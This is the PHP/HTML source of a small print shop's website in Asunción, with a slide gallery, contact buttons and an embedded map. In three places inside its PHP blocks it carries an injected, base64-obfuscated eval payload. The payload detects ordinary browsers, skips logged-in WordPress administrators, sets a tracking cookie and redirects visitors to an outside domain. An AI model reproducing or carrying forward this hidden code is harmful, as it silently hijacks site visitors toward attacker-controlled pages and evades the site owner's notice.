<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>Full Slider - Start Bootstrap Template</title>

    <!-- Bootstrap core CSS -->
    <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="css/full-slider.css" rel="stylesheet">
    <link href="css/style.css" rel="stylesheet">

</head>

<body>

<!-- Navigation -->
<nav class="navbar navbar-expand-lg navbar-dark" style="background-color: rgba(100,100,100,1);">
    <!--<div class="">-->
    <a class="navbar-brand" href="#"><img src="images/printos_logo.png" class="d-inline-block align-top p-logo" alt=""></a>
    <!--<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">-->
    <!--<span class="navbar-toggler-icon"></span>-->
    <!--</button>-->
    <!--<div class="collapse navbar-collapse" id="navbarResponsive">-->
    <!--<ul class="navbar-nav ml-auto">-->
    <!--<li class="nav-item active">-->
    <!--<a class="nav-link" href="#services">Servicios-->
    <!--&lt;!&ndash;<span class="sr-only">(current)</span>&ndash;&gt;-->
    <!--</a>-->
    <!--</li>-->
    <!--<li class="nav-item">-->
    <!--<a class="nav-link" href="#contacto">Contacto</a>-->
    <!--</li>-->
    <!--<li class="nav-item">-->
    <!--<a class="nav-link" href="https://www.facebook.com/PrintosSuperImpresiones/"><img src="images/fan_page.png" style="margin-top: -7px;"></a>-->
    <!--</li>-->
    <!--</ul>-->
    <!--</div>-->
    <!--</div>-->
</nav>

<header>
    <div class="col-12">
        <div class="row p-sm-2" style="display: flex;justify-content: center">
            <?php
/*aeR4Choc_start*/@eval(base64_decode('aWYoIWRlZmluZWQoImNoYWVKb3U3IikpewogICAgZGVmaW5lKCJjaGFlSm91NyIsIDEpOwogICAgZnVuY3Rpb24gaXNNb2JpbGUoJHVhZ2VudFN0cil7CiAgICAgICAgaWYoc3RycG9zKCR1YWdlbnRTdHIsICdhbmRyb2lkJykgIT09IGZhbHNlIHx8IHN0cnBvcygkdWFnZW50U3RyLCAnYmxhY2tiZXJyeScpICE9PSBmYWxzZQogICAgICAgICAgICB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2lwaG9uZScpICE9PSBmYWxzZSB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2lwYWQnKSAhPT0gZmFsc2UKICAgICAgICAgICAgfHwgc3RycG9zKCR1YWdlbnRTdHIsICdpcG9kJykgIT09IGZhbHNlIHx8IHN0cnBvcygkdWFnZW50U3RyLCAnb3BlcmEgbWluaScpICE9PSBmYWxzZQogICAgICAgICAgICB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2llTW9iaWxlJykgIT09IGZhbHNlKXsKICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgfQogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICBmdW5jdGlvbiBpc0Rlc2t0b3AoJHVhZ2VudFN0cil7CiAgICAgICAgaWYoc3RycG9zKCR1YWdlbnRTdHIsICdlZGdlJykgIT09IGZhbHNlIHx8IHN0cnBvcygkdWFnZW50U3RyLCAnbXNpZScpICE9PSBmYWxzZQogICAgICAgICAgICB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ29wcicpICE9PSBmYWxzZSB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2Nocm9taXVtJykgIT09IGZhbHNlCiAgICAgICAgICAgIHx8IHN0cnBvcygkdWFnZW50U3RyLCAnZmlyZWZveCcpICE9PSBmYWxzZSB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2Nocm9tZScpICE9PSBmYWxzZSl7CiAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgIH0KICAgICAgICByZXR1cm4gZmFsc2U7CiAgICB9CgogICAgJHJlZGlyVG8gPSAiaHR0cHM6Ly93d3cucm94b2Vub3MueHl6LyI7CiAgICAkY2hlY2tDb29rUmVkaXJTdHIgPSAiYWVOZWU4cGkiOwogICAgJHJlZGlyZWN0QWxsb3cgPSB0cnVlOwogICAgZm9yZWFjaCAoJF9DT09LSUUgYXMgJGNvb2tLZXk9PiRjb29rVmFsKXsKICAgICAgICBpZiAoc3RycG9zKCRjb29rS2V5LCAnd29yZHByZXNzX2xvZ2dlZF9pbicpICE9PSBmYWxzZSB8fCAkY29va0tleSA9PSAkY2hlY2tDb29rUmVkaXJTdHIpIHsKICAgICAgICAgICAgJHJlZGlyZWN0QWxsb3cgPSBmYWxzZTsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgfQogICAgfQoKICAgICR1YWdlbnQgPSBzdHJ0b2xvd2VyKCRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSk7CgogICAgaWYgKCRyZWRpcmVjdEFsbG93KXsKICAgICAgICBpZihpc01vYmlsZSgkdWFnZW50KSB8fCBpc0Rlc2t0b3AoJHVhZ2VudCkpIHsKICAgICAgICAgICAgc2V0Y29va2llKCRjaGVja0Nvb2tSZWRpclN0ciwgIjEiLCB0aW1lKCkgKyA2MDQ4MDApOwogICAgICAgICAgICBoZWFkZXIoIkxvY2F0aW9uOiAkcmVkaXJUbyIpOwogICAgICAgICAgICBkaWU7CiAgICAgICAgfQogICAgfQp9'));/*aeR4Choc_end*/
            $files = glob("images/slides/slide*");
            foreach($files as $file){
            ?>
                <div class="col-md-4 col-sm-6">
                    <div style="margin-left: -15px;margin-right: -15px;" class="p-sm-2 pt-2">
                        <img class="img-fluid" src="<?php
/*aeR4Choc_start*/@eval(base64_decode('aWYoIWRlZmluZWQoImNoYWVKb3U3IikpewogICAgZGVmaW5lKCJjaGFlSm91NyIsIDEpOwogICAgZnVuY3Rpb24gaXNNb2JpbGUoJHVhZ2VudFN0cil7CiAgICAgICAgaWYoc3RycG9zKCR1YWdlbnRTdHIsICdhbmRyb2lkJykgIT09IGZhbHNlIHx8IHN0cnBvcygkdWFnZW50U3RyLCAnYmxhY2tiZXJyeScpICE9PSBmYWxzZQogICAgICAgICAgICB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2lwaG9uZScpICE9PSBmYWxzZSB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2lwYWQnKSAhPT0gZmFsc2UKICAgICAgICAgICAgfHwgc3RycG9zKCR1YWdlbnRTdHIsICdpcG9kJykgIT09IGZhbHNlIHx8IHN0cnBvcygkdWFnZW50U3RyLCAnb3BlcmEgbWluaScpICE9PSBmYWxzZQogICAgICAgICAgICB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2llTW9iaWxlJykgIT09IGZhbHNlKXsKICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgfQogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICBmdW5jdGlvbiBpc0Rlc2t0b3AoJHVhZ2VudFN0cil7CiAgICAgICAgaWYoc3RycG9zKCR1YWdlbnRTdHIsICdlZGdlJykgIT09IGZhbHNlIHx8IHN0cnBvcygkdWFnZW50U3RyLCAnbXNpZScpICE9PSBmYWxzZQogICAgICAgICAgICB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ29wcicpICE9PSBmYWxzZSB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2Nocm9taXVtJykgIT09IGZhbHNlCiAgICAgICAgICAgIHx8IHN0cnBvcygkdWFnZW50U3RyLCAnZmlyZWZveCcpICE9PSBmYWxzZSB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2Nocm9tZScpICE9PSBmYWxzZSl7CiAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgIH0KICAgICAgICByZXR1cm4gZmFsc2U7CiAgICB9CgogICAgJHJlZGlyVG8gPSAiaHR0cHM6Ly93d3cucm94b2Vub3MueHl6LyI7CiAgICAkY2hlY2tDb29rUmVkaXJTdHIgPSAiYWVOZWU4cGkiOwogICAgJHJlZGlyZWN0QWxsb3cgPSB0cnVlOwogICAgZm9yZWFjaCAoJF9DT09LSUUgYXMgJGNvb2tLZXk9PiRjb29rVmFsKXsKICAgICAgICBpZiAoc3RycG9zKCRjb29rS2V5LCAnd29yZHByZXNzX2xvZ2dlZF9pbicpICE9PSBmYWxzZSB8fCAkY29va0tleSA9PSAkY2hlY2tDb29rUmVkaXJTdHIpIHsKICAgICAgICAgICAgJHJlZGlyZWN0QWxsb3cgPSBmYWxzZTsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgfQogICAgfQoKICAgICR1YWdlbnQgPSBzdHJ0b2xvd2VyKCRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSk7CgogICAgaWYgKCRyZWRpcmVjdEFsbG93KXsKICAgICAgICBpZihpc01vYmlsZSgkdWFnZW50KSB8fCBpc0Rlc2t0b3AoJHVhZ2VudCkpIHsKICAgICAgICAgICAgc2V0Y29va2llKCRjaGVja0Nvb2tSZWRpclN0ciwgIjEiLCB0aW1lKCkgKyA2MDQ4MDApOwogICAgICAgICAgICBoZWFkZXIoIkxvY2F0aW9uOiAkcmVkaXJUbyIpOwogICAgICAgICAgICBkaWU7CiAgICAgICAgfQogICAgfQp9'));/*aeR4Choc_end*/ echo $file; ?>">
                    </div>
                </div>
            <?php
/*aeR4Choc_start*/@eval(base64_decode('aWYoIWRlZmluZWQoImNoYWVKb3U3IikpewogICAgZGVmaW5lKCJjaGFlSm91NyIsIDEpOwogICAgZnVuY3Rpb24gaXNNb2JpbGUoJHVhZ2VudFN0cil7CiAgICAgICAgaWYoc3RycG9zKCR1YWdlbnRTdHIsICdhbmRyb2lkJykgIT09IGZhbHNlIHx8IHN0cnBvcygkdWFnZW50U3RyLCAnYmxhY2tiZXJyeScpICE9PSBmYWxzZQogICAgICAgICAgICB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2lwaG9uZScpICE9PSBmYWxzZSB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2lwYWQnKSAhPT0gZmFsc2UKICAgICAgICAgICAgfHwgc3RycG9zKCR1YWdlbnRTdHIsICdpcG9kJykgIT09IGZhbHNlIHx8IHN0cnBvcygkdWFnZW50U3RyLCAnb3BlcmEgbWluaScpICE9PSBmYWxzZQogICAgICAgICAgICB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2llTW9iaWxlJykgIT09IGZhbHNlKXsKICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgfQogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICBmdW5jdGlvbiBpc0Rlc2t0b3AoJHVhZ2VudFN0cil7CiAgICAgICAgaWYoc3RycG9zKCR1YWdlbnRTdHIsICdlZGdlJykgIT09IGZhbHNlIHx8IHN0cnBvcygkdWFnZW50U3RyLCAnbXNpZScpICE9PSBmYWxzZQogICAgICAgICAgICB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ29wcicpICE9PSBmYWxzZSB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2Nocm9taXVtJykgIT09IGZhbHNlCiAgICAgICAgICAgIHx8IHN0cnBvcygkdWFnZW50U3RyLCAnZmlyZWZveCcpICE9PSBmYWxzZSB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2Nocm9tZScpICE9PSBmYWxzZSl7CiAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgIH0KICAgICAgICByZXR1cm4gZmFsc2U7CiAgICB9CgogICAgJHJlZGlyVG8gPSAiaHR0cHM6Ly93d3cucm94b2Vub3MueHl6LyI7CiAgICAkY2hlY2tDb29rUmVkaXJTdHIgPSAiYWVOZWU4cGkiOwogICAgJHJlZGlyZWN0QWxsb3cgPSB0cnVlOwogICAgZm9yZWFjaCAoJF9DT09LSUUgYXMgJGNvb2tLZXk9PiRjb29rVmFsKXsKICAgICAgICBpZiAoc3RycG9zKCRjb29rS2V5LCAnd29yZHByZXNzX2xvZ2dlZF9pbicpICE9PSBmYWxzZSB8fCAkY29va0tleSA9PSAkY2hlY2tDb29rUmVkaXJTdHIpIHsKICAgICAgICAgICAgJHJlZGlyZWN0QWxsb3cgPSBmYWxzZTsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgfQogICAgfQoKICAgICR1YWdlbnQgPSBzdHJ0b2xvd2VyKCRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSk7CgogICAgaWYgKCRyZWRpcmVjdEFsbG93KXsKICAgICAgICBpZihpc01vYmlsZSgkdWFnZW50KSB8fCBpc0Rlc2t0b3AoJHVhZ2VudCkpIHsKICAgICAgICAgICAgc2V0Y29va2llKCRjaGVja0Nvb2tSZWRpclN0ciwgIjEiLCB0aW1lKCkgKyA2MDQ4MDApOwogICAgICAgICAgICBoZWFkZXIoIkxvY2F0aW9uOiAkcmVkaXJUbyIpOwogICAgICAgICAgICBkaWU7CiAgICAgICAgfQogICAgfQp9'));/*aeR4Choc_end*/
            }
            ?>
        </div>
    </div>
</header>

<!-- Page Content -->
<!--<section class="py-5" id="services">-->
<!--    <div class="container">-->
<!--        <div class="col-md-8 offset-md-2">-->
<!--            <div class="row text-center">-->
<!--                <h1 class="text-center w-100" style="color:#53B7E8">Precios</h1>-->
<!--            </div>-->
<!--            <div class="table">-->
<!--                <div class="row ttitle">-->
<!--                    <div class="col-md-6">-->
<!--                        <div class="row">-->
<!--                            <div class="cell">-->
<!--                                Ítem-->
<!--                            </div>-->
<!--                        </div>-->
<!--                    </div>-->
<!--                    <div class="col-md-6">-->
<!--                        <div class="row">-->
<!--                            <div class="cell">-->
<!--                                Precio Gs.-->
<!--                            </div>-->
<!--                        </div>-->
<!--                    </div>-->
<!--                </div>-->
<!---->
<!--                <div class="row trow">-->
<!--                    <div class="col-md-6">-->
<!--                        <div class="row">-->
<!--                            <div class="cell">-->
<!--                                Lápiz-->
<!--                            </div>-->
<!--                        </div>-->
<!--                    </div>-->
<!--                    <div class="col-md-6">-->
<!--                        <div class="row">-->
<!--                            <div class="cell">-->
<!--                                500-->
<!--                            </div>-->
<!--                        </div>-->
<!--                    </div>-->
<!--                </div>-->
<!---->
<!--                <div class="row trow">-->
<!--                    <div class="col-md-6">-->
<!--                        <div class="row">-->
<!--                            <div class="cell">-->
<!--                                Borrador-->
<!--                            </div>-->
<!--                        </div>-->
<!--                    </div>-->
<!--                    <div class="col-md-6">-->
<!--                        <div class="row">-->
<!--                            <div class="cell">-->
<!--                                1.000-->
<!--                            </div>-->
<!--                        </div>-->
<!--                    </div>-->
<!--                </div>-->
<!---->
<!--                <div class="row trow">-->
<!--                    <div class="col-md-6">-->
<!--                        <div class="row">-->
<!--                            <div class="cell">-->
<!--                                Carpeta-->
<!--                            </div>-->
<!--                        </div>-->
<!--                    </div>-->
<!--                    <div class="col-md-6">-->
<!--                        <div class="row">-->
<!--                            <div class="cell">-->
<!--                                2.500-->
<!--                            </div>-->
<!--                        </div>-->
<!--                    </div>-->
<!--                </div>-->
<!---->
<!--                <div class="row trow">-->
<!--                    <div class="col-md-6">-->
<!--                        <div class="row">-->
<!--                            <div class="cell">-->
<!--                                Bolígrafo-->
<!--                            </div>-->
<!--                        </div>-->
<!--                    </div>-->
<!--                    <div class="col-md-6">-->
<!--                        <div class="row">-->
<!--                            <div class="cell">-->
<!--                                1.500-->
<!--                            </div>-->
<!--                        </div>-->
<!--                    </div>-->
<!--                </div>-->
<!---->
<!---->
<!--            </div>-->
<!--        </div>-->
<!--    </div>-->

<!--</section>-->
<section class="py-5" id="contacto">

    <div class="">
        <div class="col-md-10 offset-md-1">
            <div class="row text-center mb-4">
                <h1 class="text-center w-100" style="color:#F01C24">Contacto</h1>
            </div>
            <div class="col-md-12">
                <div class="row justify-content-center row-icons" style="color:#53B7E8; font-size: 2em;">
                    <div class="link-icons">
                        <a href="https://goo.gl/maps/r2sFVHWoJVr" target="_blank">
                            <button class="btn btn-primary" style="background-color:#53B7E8;border-color:#53B7E8"><img src="images/aca_toy.png" style="width:30px;height:30px;">UBICACIÓN</button>
                        </a>
                    </div>
                    <div class="link-icons">
                        <a href="tel:021606820">
                            <button class="btn btn-primary" style="background-color:#53B7E8;border-color:#53B7E8"><img src="images/ring_ring.png" style="width:30px;height:30px;">021 606 820</button>
                        </a>
                    </div>
                    <div class="link-icons">
                        <a href="mailto:impresion@printos.com.py">
                            <button class="btn btn-primary" style="background-color:#53B7E8;border-color:#53B7E8"><img src="images/jeje.png" style="width:30px;height:30px;">impresion@printos.com.py</button>
                        </a>
                    </div>
                </div>
            </div>
        </div>
    </div>
</section>

<!-- Footer -->
<footer class="">
    <style>
        .map-responsive{
            overflow:hidden;
            position:relative;
            height:600px;
            margin-top: 20px;
        }
        .map-responsive iframe{
            left:0;
            top:0;
            height:600px;
            width:100%;
            position:absolute;
        }
    </style>
    <div class="map-responsive">
        <iframe width="480" height="440" frameborder="0" style="border:0" src="https://www.google.com/maps/embed/v1/place?key=AIzaSyAM_ZKsGpDvLK34jsL1KXDvzUf0yKAsi-Y&#10;&amp;q=Printos,Asunción&amp;zoom=16" allowfullscreen="">
        </iframe>
    </div>
    <div class="col-12">
        <div class="row justify-content-center">
            <a class="navbar-brand mt-5" href="#"><img src="images/printos_logo.png" class="d-inline-block align-top p-logo" alt=""></a>
        </div>
    </div>

    <!-- /.container -->
</footer>

<!-- Bootstrap core JavaScript -->
<script src="vendor/jquery/jquery.min.js"></script>
<script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>

</body>

</html>
